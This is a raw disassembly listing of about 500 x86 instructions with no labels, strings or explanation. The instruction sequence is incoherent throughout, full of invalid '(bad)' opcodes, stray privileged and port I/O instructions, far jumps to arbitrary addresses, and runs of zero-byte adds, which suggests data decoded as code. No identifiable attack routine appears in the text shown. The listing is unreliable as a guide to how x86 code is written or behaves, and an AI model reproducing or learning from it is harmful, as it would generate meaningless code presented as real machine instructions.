  4171d2:	sbb    ch,BYTE PTR [esi+0x7]
  4171d5:	or     al,0x75
  4171d7:	add    bh,BYTE PTR [edx]
  4171d9:	mov    edx,0x16eed589
  4171de:	pushf  
  4171df:	(bad)  
  4171e0:	hlt    
  4171e1:	addr16 repnz mov ebp,0xb9de74ff
  4171e8:	xchg   ecx,eax
  4171e9:	jmp    0xf701f864
  4171ee:	cli    
  4171ef:	sbb    bh,bh
  4171f1:	call   0xe8ab236c
  4171f6:	add    BYTE PTR [eax],al
  4171f8:	add    BYTE PTR [eax],al
  4171fa:	add    ch,ah
  4171fc:	mov    esi,0xcfd7b9f3
  417201:	jecxz  0x417275
  417203:	sub    eax,0x277fe863
  417208:	pop    esi
  417209:	std    
  41720a:	(bad)  
  41720b:	mov    BYTE PTR [edi-0x3106babd],0xf7
  417212:	adc    DWORD PTR [esi+0x70],esp
  417215:	add    cl,ch
  417217:	repz pop ebx
  417219:	std    
  41721a:	out    0xfa,al
  41721c:	repnz (bad) 
  41721e:	call   0xf0ab2799
  417223:	imul   esi,DWORD PTR [eax],0xffffff89
  417226:	daa    
  417227:	mov    ecx,0xa86cef55
  41722c:	or     eax,0x277f283
  417231:	add    BYTE PTR [ebx-0x50],dl
  417234:	xchg   DWORD PTR [ebx-0x3b],edi
  417237:	sbb    DWORD PTR [ebx-0x22],esp
  41723a:	or     BYTE PTR [esi+0x2],dh
  41723d:	push   0x1d
  41723f:	cli    
  417240:	(bad)  
  417241:	xlat   BYTE PTR ds:[ebx]
  417242:	and    DWORD PTR [ecx+0x31],edx
  417245:	pop    ds
  417246:	call   0x611383c1
  41724b:	repnz add bh,BYTE PTR [ecx]
  41724e:	mov    edx,0xe9d88484
  417253:	jbe    0x417257
  417255:	mov    DWORD PTR [ecx+ebp*2],ebp
  417258:	mov    DWORD PTR [ebx-0x63],eax
  41725b:	add    BYTE PTR [esi],dl
  41725d:	mov    BYTE PTR [eax+0x0],ah
  417260:	add    BYTE PTR [eax],al
  417262:	add    BYTE PTR [eax],al
  417264:	mov    ds:0x200836a,al
  417269:	icebp  
  41726a:	cmp    DWORD PTR [eax+0x7ffffe8c],0x2a
  417271:	push   es
  417272:	or     eax,DWORD PTR [ebx+ebp*4-0x18000002]
  417279:	bound  eax,QWORD PTR [ebp-0x22c61afc]
  41727f:	test   DWORD PTR [ebx+0x5ca083f3],ebp
  417285:	push   es
  417286:	add    BYTE PTR [eax-0x7bf50185],al
  41728c:	mov    ds:0x97fffffe,eax
  417291:	inc    edx
  417292:	test   DWORD PTR [eax],ecx
  417294:	xchg   ecx,eax
  417295:	pop    ss
  417296:	or     eax,DWORD PTR [edi+eiz*4-0x73000002]
  41729d:	idiv   edi
  41729f:	push   cs
  4172a0:	mov    al,ds:0x1c000080
  4172a5:	jg     0x41726f
  4172a7:	(bad)  
  4172a8:	fmul   QWORD PTR [edi+0x2264cb88]
  4172ae:	dec    edi
  4172af:	(bad)  
  4172b0:	jmp    0x417232
  4172b2:	shl    BYTE PTR [ebp+ebp*1-0x77],0x41
  4172b7:	in     al,0x9f
  4172b9:	mov    ?,WORD PTR [eax+edi*1-0x72fffa1c]
  4172c0:	icebp  
  4172c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172c2:	repz (bad) 
  4172c4:	mov    ebx,0x5518ed
  4172c9:	add    BYTE PTR [eax],al
  4172cb:	add    BYTE PTR [eax],al
  4172cd:	mov    ebx,0x4f5954e2
  4172d2:	mov    ebp,0x878a74fa
  4172d7:	into   
  4172d8:	push   ecx
  4172d9:	dec    ecx
  4172da:	dec    eax
  4172db:	stc    
  4172dc:	call   0x3dbb99
  4172e1:	adc    ch,al
  4172e3:	jae    0x417334
  4172e5:	jne    0x4172cb
  4172e7:	aad    0xef
  4172e9:	inc    BYTE PTR [esi]
  4172eb:	fs push ebp
  4172ed:	sub    ecx,esi
  4172ef:	(bad)
  4172f2:	sbb    BYTE PTR [ecx],bl
  4172f4:	or     BYTE PTR [ebp+0x6b],dh
  4172f7:	mov    ?,WORD PTR [ebx-0x2a02feb]
  4172fd:	dec    ebp
  4172fe:	mov    ah,0xb4
  417300:	cld    
  417301:	pop    edx
  417302:	in     al,dx
  417303:	inc    esp
  417304:	or     al,0xf6
  417306:	mov    dl,0x5f
  417308:	je     0x4172a8
  41730a:	in     al,0x4e
  41730c:	dec    edi
  41730d:	lock lea ebx,[ebp-0x18]
  417311:	or     al,0xa6
  417313:	pusha  
  417314:	std    
  417315:	stc    
  417316:	sub    dl,ch
  417318:	sbb    esi,esi
  41731a:	popf   
  41731b:	or     DWORD PTR [edi],eax
  41731d:	out    dx,al
  41731e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41731f:	or     DWORD PTR [ecx-0x8399bba],ecx
  417325:	sub    ch,0x16
  417328:	std    
  417329:	or     cl,BYTE PTR [eax]
  41732b:	ins    BYTE PTR es:[edi],dx
  41732c:	or     al,0x2
  41732e:	(bad)  
  41732f:	pop    esp
  417330:	call   0x417335
  417335:	add    BYTE PTR [edx-0x56],ah
  417338:	pusha  
  417339:	std    
  41733a:	test   BYTE PTR [ebp-0x6201ffa3],0x59
  417341:	mov    DWORD PTR [eax+0x37],esp
  417344:	ins    BYTE PTR es:[edi],dx
  417345:	and    al,0x34
  417347:	cmp    BYTE PTR [ebp+0x5d],bl
  41734a:	(bad)  
  41734b:	and    eax,0xa22e5e60
  417350:	inc    edx
  417351:	add    al,0x75
  417353:	test   BYTE PTR [eax+0x101deeec],0x7f
  41735a:	mov    eax,ds:0x75ffff62
  41735f:	lock add al,0x51
  417363:	add    dh,BYTE PTR [edi]
  417365:	pop    edi
  417366:	or     ch,BYTE PTR es:[ecx+ecx*4-0x73]
  41736b:	push   esi
  41736c:	xchg   esi,eax
  41736d:	pop    edi
  41736e:	and    eax,0x186c908d
  417373:	lds    eax,FWORD PTR [ebp-0xcbe09a1]
  417379:	out    0x68,al
  41737b:	shr    dl,0x1
  41737e:	loope  0x417347
  417380:	pop    ebx
  417381:	mov    DWORD PTR [ebp+0x56],ebx
  417384:	pop    di
  417386:	lds    ebp,FWORD PTR [edx-0x3e]
  417389:	pop    ebp
  41738a:	push   eax
  41738b:	pop    eax
  41738c:	pusha  
  41738d:	leave  
  41738e:	jle    0x41740d
  417390:	daa    
  417391:	fdivr  DWORD PTR [esi-0x4d]
  417394:	pushf  
  417395:	mov    bl,0x39
  417397:	out    dx,al
  417398:	dec    edx
  417399:	repnz add BYTE PTR [eax],al
  41739c:	add    BYTE PTR [eax],al
  41739e:	add    BYTE PTR [edx+0x2],dh
  4173a1:	(bad)  
  4173a2:	iret   
  4173a3:	jle    0x417330
  4173a5:	setno  BYTE PTR [eax+0xd4aea0a]
  4173ac:	pop    esi
  4173ad:	ficomp WORD PTR [esi+0x10]
  4173b0:	jg     0x4173d9
  4173b2:	fsub   DWORD PTR [eax-0x75]
  4173b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173b6:	pcmpeqb mm0,QWORD PTR [eax]
  4173b9:	call   0x865e:0x9706865e
  4173c0:	push   ss
  4173c1:	ffree  st(3)
  4173c3:	jmp    0xf2b8:0xe2102384
  4173ca:	pop    esi
  4173cb:	pushw  es
  4173cd:	iret   
  4173ce:	mov    BYTE PTR ds:0x2dbdd657,dh
  4173d4:	push   eax
  4173d5:	es or  dl,al
  4173d8:	shl    edx,cl
  4173da:	nop
  4173db:	neg    BYTE PTR [edx-0x44]
  4173de:	pop    esi
  4173df:	mov    al,0xb2
  4173e1:	inc    eax
  4173e3:	pop    ss
  4173e4:	mov    edi,edi
  4173e6:	call   0xb09eb672
  4173eb:	xor    al,0xa
  4173ed:	add    BYTE PTR [esi+edi*8],dh
  4173f0:	or     WORD PTR [ebp+0x1debd72e],0x277
  4173f9:	add    BYTE PTR [edi],bl
  4173fb:	pop    esi
  4173fd:	mov    dh,ch
  4173ff:	call   0x0:0x815816
  417406:	add    BYTE PTR [eax],al
  417408:	push   esp
  417409:	idiv   esi
  41740b:	call   0xb5ccb3ff
  417410:	xchg   edx,eax
  417411:	retf   0x704e
  417414:	cmp    ah,BYTE PTR [ebx]
  417416:	or     BYTE PTR [edx],bl
  417418:	mov    cl,0xb2
  41741a:	dec    edi
  41741b:	ret    
  41741c:	cdq    
  41741d:	mov    dl,0xc4
  41741f:	lods   eax,DWORD PTR ds:[esi]
  417420:	xchg   edx,eax
  417421:	test   bh,0xb4
  417424:	ss push edi
  417426:	mov    BYTE PTR [ebp-0x5a78ddae],dl
  41742c:	pop    edx
  41742d:	push   ds
  41742e:	xchg   DWORD PTR [ebp-0xb02d5ae],ebp
  417434:	into   
  417435:	icebp  
  417436:	aas    
  417437:	jmp    0x7fb4b639
  41743c:	or     al,0xc7
  41743e:	mov    bh,BYTE PTR [ebp+0x52]
  417441:	push   cs
  417442:	pop    eax
  417443:	adc    DWORD PTR [eax+0x5e8ff22],ebx
  417449:	mov    esi,0xbdf1e123
  41744e:	and    eax,DWORD PTR [ecx]
  417450:	jmp    0x23bd:0xfe3123bd
  417457:	cmc    
  417458:	sti    
  417459:	mov    ebp,0xbdefe523
  41745e:	and    eax,DWORD PTR [eax]
  417460:	push   0x64244487
  417465:	mov    cs,WORD PTR [edx-0x3cfd87b4]
  41746b:	inc    esp
  41746c:	add    BYTE PTR [eax],al
  41746e:	add    BYTE PTR [eax],al
  417470:	add    BYTE PTR [eax+0x2a],bh
  417473:	add    al,0x0
  417475:	mov    WORD PTR [edx],es
  417477:	ret    
  417478:	inc    esp
  417479:	mov    eax,0x9cfffd26
  41747e:	add    al,bl
  417480:	inc    esp
  417481:	mov    eax,0x8c0001f2
  417486:	add    ch,al
  417488:	jl     0x417412
  41748a:	add    DWORD PTR [eax],eax
  41748c:	mov    ebx,DWORD PTR [edx]
  41748e:	(bad)
  417492:	inc    esi
  417493:	dec    ebp
  417494:	push   eax
  417495:	les    ebx,FWORD PTR [edx+0x7db3ff3f]
  41749b:	shl    BYTE PTR [esi+ecx*2-0x7b],0x44
  4174a0:	and    al,0x14
  4174a2:	xchg   edx,eax
  4174a3:	mov    cl,BYTE PTR [eax+ebp*2+0x2]
  4174a7:	test   DWORD PTR [eax+edi*2+0x1e],eax
  4174ab:	call   0x427d08
  4174b0:	test   BYTE PTR [edi+0x0],0x74
  4174b4:	adc    ah,BYTE PTR [edi-0x78efdeb6]
  4174ba:	inc    ebp
  4174bb:	add    eax,0x448b1d89
  4174c0:	and    al,0x8
  4174c2:	mov    ecx,DWORD PTR [ecx+0xc]
  4174c5:	test   DWORD PTR [ecx],eax
  4174c7:	pop    esi
  4174c8:	mov    edi,DWORD PTR [ecx-0x6b]
  4174cb:	mov    edi,0x888cdc08
  4174d0:	in     al,dx
  4174d1:	dec    edi
  4174d2:	shl    BYTE PTR [ebx+0x53],cl
  4174d5:	add    BYTE PTR [eax],al
  4174d7:	add    BYTE PTR [eax],al
  4174d9:	add    BYTE PTR [edx-0x4fba7571],bl
  4174df:	xchg   ecx,eax
  4174e0:	mov    al,BYTE PTR [ebp+0x75]
  4174e3:	aaa    
  4174e4:	mov    cl,0x69
  4174e6:	ja     0x4174f8
  4174e8:	ins    BYTE PTR es:[edi],dx
  4174e9:	adc    bh,BYTE PTR [edx-0x31cea3c4]
  4174ef:	add    bh,BYTE PTR [ebp+0xb1e1ffb]
  4174f5:	inc    ebx
  4174f6:	inc    eax
  4174f7:	(bad)  
  4174f8:	mov    ?,WORD PTR [ebx-0x2b]
  4174fb:	ret    
  4174fc:	imul   esi,DWORD PTR [edi+0x72],0x6a
  417500:	add    DWORD PTR [edx+0x3b],ebp
  417503:	(bad)  
  417505:	repz sbb eax,0x741d1983
  41750b:	imul   ecx,DWORD PTR [eax-0x2a60073b],0x1
  417512:	(bad)  
  417513:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417514:	mov    cl,0x8a
  417516:	mov    eax,0x7569b0cb
  41751b:	xor    DWORD PTR [ecx],eax
  41751d:	push   0x74
  41751f:	mov    bl,0x2c
  417521:	add    esi,DWORD PTR [ebx+ebp*2-0x80]
  417525:	les    ebp,FWORD PTR [ecx-0x68]
  417528:	imul   edi,DWORD PTR [edx+edi*2],0xd35d5bbc
  41752f:	mov    al,ds:0xe0c0c14a
  417534:	ins    BYTE PTR es:[edi],dx
  417535:	adc    DWORD PTR [ecx],0xc255b053
  41753b:	jae    0x417542
  41753d:	adc    BYTE PTR [eax],al
  41753f:	add    BYTE PTR [eax],al
  417541:	add    BYTE PTR [eax],al
  417543:	jne    0x4175b0
  417545:	mov    al,bh
  417547:	(bad)  
  417548:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417549:	icebp  
  41754a:	adc    BYTE PTR [ebp+0x6b],0x80
  41754e:	and    eax,0xfd097175
  417553:	test   al,0x5b
  417555:	dec    eax
  417556:	inc    ecx
  417557:	jne    0x4175a5
  417559:	repz rol DWORD PTR [edi-0x4276fe55],cl
  417560:	add    DWORD PTR [eax-0x47],esi
  417563:	(bad)  
  417564:	jle    0x417528
  417566:	shl    DWORD PTR [ecx+0x10],1
  417569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41756a:	ins    DWORD PTR es:[edi],dx
  41756b:	lar    esp,di
  41756e:	add    edi,DWORD PTR [eax-0x79a50d32]
  417574:	repnz xlat BYTE PTR ds:[ebx]
  417576:	ret    
  417577:	stos   BYTE PTR es:[edi],al
  417578:	jmp    0x4824:0x8748b9fe
  41757f:	lar    esi,WORD PTR [edi]
  417582:	inc    edx
  417583:	ss pop ecx
  417585:	call   0xfd03dbe4
  41758a:	ret    
  41758b:	or     BYTE PTR [ecx+0x3df44814],0xf3
  417592:	mov    esi,cs
  417594:	bound  edi,QWORD PTR ds:0xe7028504
  41759a:	sbb    esi,0xffffffee
  41759d:	out    0xd0,al
  41759f:	test   DWORD PTR [ebp-0x535aa054],eax
  4175a5:	pop    ebp
  4175a6:	rol    DWORD PTR [eax],1
  4175a8:	add    BYTE PTR [eax],al
  4175aa:	add    BYTE PTR [eax],al
  4175ac:	inc    esi
  4175ad:	push   esp
  4175ae:	fmul   QWORD PTR [ebx]
  4175b0:	inc    eax
  4175b1:	out    dx,al
  4175b2:	xchg   esi,eax
  4175b3:	icebp  
  4175b4:	jp     0x4175b8
  4175b6:	push   edx
  4175b7:	icebp  
  4175b8:	xor    esi,ecx
  4175ba:	fimul  WORD PTR [eax+0xbc146b6]
  4175c0:	lds    edx,FWORD PTR [ebx-0x4c]
  4175c3:	or     esi,edx
  4175c5:	int    0xa
  4175c7:	pop    ebx
  4175c8:	data16 (bad) 
  4175ca:	repz ret 
  4175cc:	or     bh,BYTE PTR [edi+0x27]
  4175cf:	shr    DWORD PTR [edx+0x53],1
  4175d2:	hlt    
  4175d3:	add    esp,DWORD PTR [edx+eax*8-0x1a]
  4175d7:	sbb    dh,dl
  4175d9:	jmp    esi
  4175db:	add    esp,DWORD PTR [esi+0x21]
  4175de:	add    BYTE PTR [esp+esi*4+0x7],ah
  4175e2:	push   eax
  4175e3:	add    DWORD PTR [esi+0x63e6fcbe],esi
  4175e9:	mov    WORD PTR [ecx-0x2680aac4],cs
  4175ef:	pop    ebp
  4175f0:	retf   0x7356
  4175f3:	aad    0xeb
  4175f5:	mov    edi,0x157fd10f
  4175fa:	std    
  4175fb:	mov    esi,0x897342f5
  417600:	xor    al,0xbf
  417602:	clc    
  417603:	jmp    0x92354547
  417608:	mov    eax,ds:0xf69efd15
  41760d:	xlat   BYTE PTR ds:[ebx]
  41760e:	clc    
  41760f:	jmp    0x417614
  417614:	add    BYTE PTR [ebp-0x7edb76f7],ah
  41761a:	push   esi
  41761b:	xor    BYTE PTR [ecx+0x7efd1531],dl
  417621:	clc    
  417622:	mov    esi,0xba1f16f8
  417627:	(bad)  
  417628:	stos   DWORD PTR es:[edi],eax
  417629:	dec    edx
  41762a:	push   ebx
  41762b:	push   esp
  41762c:	jb     0x417608
  41762e:	and    esp,0x3465f361
  417634:	push   0x3a
  417636:	pop    ds
  417637:	or     BYTE PTR [esi+0x3],cl
  41763a:	mov    bl,BYTE PTR [ebx]
  41763c:	(bad)  [ebx]
  41763e:	adc    eax,DWORD PTR [eax]
  417640:	xchg   edi,eax
  417641:	out    0xda,eax
  417643:	xor    esp,DWORD PTR [ebx+edi*1]
  417646:	push   ebx
  417647:	mov    dh,BYTE PTR [ecx]
  417649:	mov    edi,0x9ede8931
  41764e:	and    esi,esi
  417650:	push   ds
  417651:	scas   eax,DWORD PTR es:[edi]
  417652:	cmp    eax,0x7e6f16
  417658:	jmp    0x4176d0
  41765a:	add    cl,BYTE PTR [ecx-0x35c51700]
  417660:	inc    ebx
  417661:	fsub   QWORD PTR [ebx-0x43]
  417664:	sub    BYTE PTR [ecx+0x3],bl
  417667:	or     BYTE PTR [ebx],dh
  417669:	xchg   ebp,eax
  41766a:	test   BYTE PTR [ebp+0x14],0xcb
  41766e:	and    ch,0x1
  417671:	fdiv   st(6),st
  417673:	jle    0x4176f3
  417675:	sar    bh,0x70
  417678:	adc    al,BYTE PTR [eax]
  41767a:	add    BYTE PTR [eax],al
  41767c:	add    BYTE PTR [eax],al
  41767e:	push   edi
  41767f:	inc    eax
  417680:	or     eax,0x74026439
  417685:	or     ah,BYTE PTR [edi]
  417687:	inc    eax
  417688:	and    DWORD PTR [ecx+0x1cce793],ecx
  41768e:	mov    esi,?
  417690:	xchg   BYTE PTR [ebp-0x74],al
  417693:	cmc    
  417694:	mov    esp,0x8879e74
  417699:	sub    DWORD PTR [edx+0x5a],0xfffffffc
  41769d:	movups XMMWORD PTR [eax-0x2],xmm4
  4176a1:	call   FWORD PTR [edi+edi*2+0x46]
  4176a5:	or     BYTE PTR [edx],dl
  4176a7:	inc    ebp
  4176a8:	add    DWORD PTR [ecx],eax
  4176aa:	stos   BYTE PTR es:[edi],al
  4176ab:	repnz enter 0x4c43,0x94
  4176b0:	xchg   BYTE PTR [eax+eax*4+0x4a],al
  4176b4:	cld    
  4176b5:	adc    eax,0x3d5774
  4176ba:	stos   DWORD PTR es:[edi],eax
  4176bb:	inc    ecx
  4176bc:	adc    eax,0x33f2108d
  4176c1:	push   ecx
  4176c3:	popa   
  4176c4:	dec    ebp
  4176c5:	jmp    eax
  4176c7:	icebp  
  4176c8:	and    ecx,DWORD PTR [ebp-0xbc0e30]
  4176ce:	and    ebx,esi
  4176d0:	jo     0x4176d0
  4176d2:	pop    ebx
  4176d3:	stos   DWORD PTR es:[edi],eax
  4176d4:	push   ebp
  4176d5:	mov    al,dl
  4176d7:	icebp  
  4176d8:	adc    bh,bh
  4176da:	jne    0x4176e8
  4176dc:	mov    esi,DWORD PTR ds:0xfd4cd30d
  4176e2:	add    BYTE PTR [eax],al
  4176e4:	add    BYTE PTR [eax],al
  4176e6:	add    dl,dh
  4176e8:	aam    0x53
  4176ea:	sub    ebx,0xf1840850
  4176f0:	pop    edx
  4176f1:	add    DWORD PTR [eax],eax
  4176f3:	cmc    
  4176f4:	fistp  WORD PTR [ecx+edx*1]
  4176f7:	jne    0x417751
  4176f9:	jge    0x41768a
  4176fb:	je     0x417758
  4176fd:	add    DWORD PTR [ecx-0x35],ebp
  417700:	add    eax,DWORD PTR [ebx]
  417702:	xor    ebp,DWORD PTR [ecx]
  417704:	outs   dx,BYTE PTR ds:[esi]
  417705:	(bad)  
  417706:	inc    DWORD PTR [ecx]
  417708:	and    BYTE PTR [eax],ah
  41770a:	and    al,0x45
  41770c:	test   eax,0x987503bf
  417711:	adc    al,ch
  417713:	pushf  
  417714:	add    BYTE PTR [ecx],0x0
  417717:	add    BYTE PTR [eax],bl
  417719:	and    BYTE PTR [esp],ch
  41771c:	sar    BYTE PTR [ebx+eiz*1+0x69ffe459],cl
  417723:	je     0x417730
  417725:	ins    BYTE PTR es:[edi],dx
  417726:	mov    dh,0x1e
  417728:	pop    ebx
  417729:	add    DWORD PTR [edi-0x76d6b84f],eax
  41772f:	mov    ebx,0x91448a2b
  417734:	xchg   ebx,eax
  417735:	mov    WORD PTR [esi+0x69],es
  417738:	in     al,dx
  417739:	cmp    al,BYTE PTR [edi+0x371807b1]
  41773f:	mov    eax,ds:0xf10d23ff
  417744:	xchg   DWORD PTR [ecx],eax
  417746:	add    BYTE PTR [ebp-0x2a],dh
  417749:	mov    esp,0x23
  41774e:	add    BYTE PTR [eax],al
  417750:	push   ebp
  417751:	imul   ebp,DWORD PTR [ecx+0x6a],0x49
  417755:	sbb    BYTE PTR [eax-0x7c],bl
  417758:	xor    eax,0x75937d30
  41775d:	add    ah,bh
  41775f:	add    ebx,DWORD PTR [edi+0xd101e23]
  417765:	lock inc eax
  417767:	add    esi,DWORD PTR [ebp+0x7d]
  41776a:	nop    esp
  41776d:	aad    0xdf
  41776f:	loope  0x417714
  417771:	icebp  
  417772:	jb     0x41777d
  417774:	loopne 0x41774b
  417776:	retf   0xd80f
  417779:	aad    0xc2
  41777b:	movaps xmm3,XMMWORD PTR [edx-0x69]
  41777f:	mov    BYTE PTR [ebp+0x2],dh
  417782:	ss ins BYTE PTR es:[edi],dx
  417784:	jns    0x417795
  417786:	(bad)  
  417787:	push   edi
  417788:	mov    eax,0xfc2402d5
  41778d:	lds    ecx,FWORD PTR [edx]
  41778f:	sub    al,0x44
  417791:	pop    edx
  417792:	mov    eax,0x6050a1be
  417797:	rcl    BYTE PTR [esi-0x16],0xf1
  41779b:	inc    edx
  41779c:	or     DWORD PTR [ecx+0x265045e],edi
  4177a2:	out    0x8c,eax
  4177a4:	cmp    DWORD PTR [esi],esp
  4177a6:	repz imul ecx,esi,0xd
  4177aa:	mov    ss,WORD PTR [edi-0x4]
  4177ad:	dec    edx
  4177ae:	ret    0xe15a
  4177b1:	or     al,0x6c
  4177b3:	rol    BYTE PTR [eax],0x0
  4177b6:	add    BYTE PTR [eax],al
  4177b8:	add    BYTE PTR [esi+0x59af16ee],dl
  4177be:	xlat   BYTE PTR ds:[ebx]
  4177bf:	ret    0x3823
  4177c2:	or     BYTE PTR [edi+0x5e027503],dh
  4177c8:	icebp  
  4177c9:	shl    ch,cl
  4177cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177cc:	add    esi,esi
  4177ce:	inc    edx
  4177cf:	sar    ecx,cl
  4177d1:	std    
  4177d2:	(bad)  
  4177d3:	out    dx,al
  4177d4:	sbb    dh,BYTE PTR [edi+edx*8]
  4177d7:	(bad)  
  4177d9:	imul   ebp,edx,0xffffffff
  4177dc:	mov    esp,0x5744d70
  4177e1:	gs dec ebp
  4177e3:	je     0x4177b2
  4177e5:	jp     0x417799
  4177e7:	out    0xad,eax
  4177e9:	cli    
  4177ea:	add    al,BYTE PTR [eax]
  4177ec:	mov    esi,0xe3ca28e
  4177f1:	dec    edx
  4177f2:	dec    ebp
  4177f3:	je     0x4177c2
  4177f5:	out    dx,al
  4177f6:	addr16 xchg ebp,eax
  4177f8:	mov    ebp,0x7dfd4d4b
  4177fd:	jp     0x417821
  4177ff:	call   0xfd8ee563
  417804:	out    0xba,al
  417806:	and    ebp,DWORD PTR [eax]
  417808:	shl    ebp,1
  41780a:	push   cs
  41780b:	std    
  41780c:	(bad)  
  41780d:	out    dx,eax
  41780e:	(bad)  
  41780f:	and    ebx,DWORD PTR [ecx]
  417811:	add    cl,cl
  417813:	pop    ss
  417814:	jb     0x417800
  417816:	and    esi,DWORD PTR [eax+esi*2]
  417819:	loopne 0x417806
  41781b:	mov    BYTE PTR [edi],ch
  41781d:	add    BYTE PTR [eax],al
  41781f:	add    BYTE PTR [eax],al
  417821:	add    BYTE PTR [ebp-0x3d51077e],bl
  417827:	mov    edi,0x79512f28
  41782c:	clc    
  41782d:	adc    eax,0xe17b8161
  417832:	jbe    0x417807
  417834:	adc    DWORD PTR [ecx],eax
  417836:	jns    0x41782a
  417838:	(bad)  
  417839:	call   0xe9617a4c
  41783e:	jbe    0x41789a
  417840:	imul   esp
  417842:	jno    0x417846
  417844:	xchg   DWORD PTR [edi*2+0x73f57b17],esp
  41784b:	les    edi,FWORD PTR [edx-0x13]
  41784e:	test   edx,0xf22ae907
  417854:	mov    BYTE PTR [edi+0x46022e],ah
  41785a:	jl     0x4177fb
  41785c:	dec    ebp
  41785d:	(bad)  
  41785e:	jmp    0x20b1605d
  417863:	mov    eax,0x22e201fa
  417868:	xchg   DWORD PTR [ebp+0xc],eax
  41786b:	add    al,0x74
  41786e:	push   cs
  41786f:	jle    0x4178a9
  417871:	(bad)  
  417872:	enter  0x13ee,0x1
  417876:	fadd   QWORD PTR [edx]
  417878:	add    BYTE PTR [eax+0x28],ch
  41787b:	mov    edx,0x5ee3003e
  417880:	adc    eax,0x87030c13
  417885:	inc    esp
  417886:	add    BYTE PTR [eax],al
  417888:	add    BYTE PTR [eax],al
  41788a:	add    BYTE PTR [eax+0x375e5c5e],bh
  417890:	jns    0x417873
  417892:	pop    ebp
  417893:	push   cs
  417894:	push   edx
  417895:	std    
  417896:	jg     0x4178b8
  417898:	and    cl,BYTE PTR [edi]
  41789a:	add    BYTE PTR [eax+0x49],cl
  41789d:	cld    
  41789e:	je     0x417918
  4178a0:	mul    bh
  4178a2:	div    DWORD PTR [edi-0x4b]
  4178a5:	cli    
  4178a6:	and    edx,0xffffffb4
  4178a9:	jae    0x4178b8
  4178ab:	std    
  4178ac:	cmp    edx,ecx
  4178ae:	inc    ebx
  4178af:	pushf  
  4178b0:	pop    ecx
  4178b1:	repz sub dl,bl
  4178b4:	inc    ecx
  4178b5:	add    eax,DWORD PTR [esp+ecx*4]
  4178b8:	and    DWORD PTR [esp+0x68],0x42e46802
  4178c0:	add    al,BYTE PTR [eax]
  4178c2:	dec    DWORD PTR [ecx-0x32]
  4178c5:	adc    DWORD PTR [eax+0x4c],eax
  4178c8:	(bad)  [ebx+0x7edad755]
  4178ce:	in     al,dx
  4178cf:	dec    esp
  4178d0:	xchg   ebx,eax
  4178d1:	addr16 inc esp
  4178d3:	or     bh,BYTE PTR [ebx-0x28]
  4178d6:	call   0xfd59e550
  4178db:	xor    ah,cl
  4178dd:	mov    esp,0x25e3207
  4178e2:	add    BYTE PTR [ebp+0x5b],dh
  4178e5:	mov    al,BYTE PTR [esi+0x71]
  4178e8:	ficom  WORD PTR [edx+0x74]
  4178eb:	inc    esi
  4178ec:	adc    eax,0xff3f
  4178f1:	add    BYTE PTR [eax],al
  4178f3:	add    BYTE PTR [ecx+0x79f9803b],al
  4178f9:	jne    0x4178f3
  4178fb:	jle    0x417937
  4178fd:	add    DWORD PTR [ecx],0x74
  417900:	jne    0x417978
  417902:	lock into 
  417904:	fidiv  WORD PTR [ecx+0x1]
  417907:	dec    ecx
  417908:	inc    esi
  417909:	je     0x4178f2
  41790b:	(bad)  
  41790c:	in     eax,dx
  41790d:	jne    0x417914
  41790f:	call   0x455e60
  417914:	fiadd  WORD PTR [ebx]
  417916:	test   DWORD PTR [ecx-0x3e],eax
  417919:	adc    al,0x89
  41791b:	inc    esi
  41791c:	imul   eax,DWORD PTR [ebx-0x21],0x683cb244
  417923:	or     bh,al
  417925:	adc    eax,0x33454f08
  41792a:	push   esp
  41792b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41792c:	jne    0x417989
  41792e:	mov    al,BYTE PTR [esi+0x7d]
  417931:	out    0x40,al
  417933:	jae    0x4179a7
  417935:	sub    DWORD PTR [ecx-0x19],eax
  417938:	mov    BYTE PTR [ebx+0x1],bl
  41793b:	add    al,ch
  41793d:	sbb    eax,0x7bf84ff0
  417942:	add    al,0x83
  417944:	adc    BYTE PTR [ebx+0x1],bl
  417947:	add    ch,cl
  417949:	cmp    BYTE PTR [ecx],al
  41794b:	add    ch,dh
  41794d:	ror    ebp,cl
  41794f:	pop    es
  417950:	pop    ebp
  417951:	ret    
  417952:	test   eax,0xbe027500
  417957:	mov    al,BYTE PTR [eax]
  417959:	add    BYTE PTR [eax],al
  41795b:	add    BYTE PTR [eax],al
  41795d:	mov    ebx,0x3ebe6bf2
  417962:	mov    dl,0x63
  417964:	mov    esi,0x26c0b222
  417969:	sub    bh,dl
  41796b:	out    dx,al
  41796c:	cmp    al,0xb6
  41796e:	dec    esi
  41796f:	lock add esi,DWORD PTR [ebp+0x2]
  417973:	ss out dx,al
  417975:	(bad)  
  417976:	mul    BYTE PTR [esi-0x17b60bfd]
  41797c:	into   
  41797d:	or     sp,WORD PTR [edi+edx*2-0x2999027d]
  417985:	loop   0x417938
  417987:	xchg   ebx,eax
  417988:	fdiv   st,st(5)
  41798a:	into   
  41798b:	add    bh,bh
  41798d:	addr16 sahf 
  41798f:	outs   dx,DWORD PTR ds:[esi]
  417990:	mov    ebp,0x23ad7f82
  417995:	and    eax,0x7503e7da
  41799a:	and    dh,0xd9
  41799d:	jp     0x4179f9
  41799f:	inc    edi
  4179a0:	popf   
  4179a1:	jne    0x4179a5
  4179a3:	pusha  
  4179a4:	retf   0x798e
  4179a7:	and    al,0xf4
  4179a9:	(bad)  
  4179aa:	mov    ecx,0x4caa85c5
  4179af:	mov    esi,0xe3d57503
  4179b4:	jle    0x4179f4
  4179b6:	(bad)  
  4179b7:	arpl   WORD PTR ds:0xc2700401,di
  4179bd:	push   esi
  4179be:	jnp    0x4179e5
  4179c0:	sbb    al,0x0
  4179c2:	add    BYTE PTR [eax],al
  4179c4:	add    BYTE PTR [eax],al
  4179c6:	pmaxsw mm2,QWORD PTR [ebp-0x4fa58527]
  4179cd:	stos   DWORD PTR es:[edi],eax
  4179ce:	jne    0x4179d2
  4179d0:	jb     0x4179fe
  4179d2:	mul    BYTE PTR [edi]
  4179d4:	repz mov ecx,0xb2007fd0
  4179da:	jbe    0x4179b2
  4179dc:	dec    edi
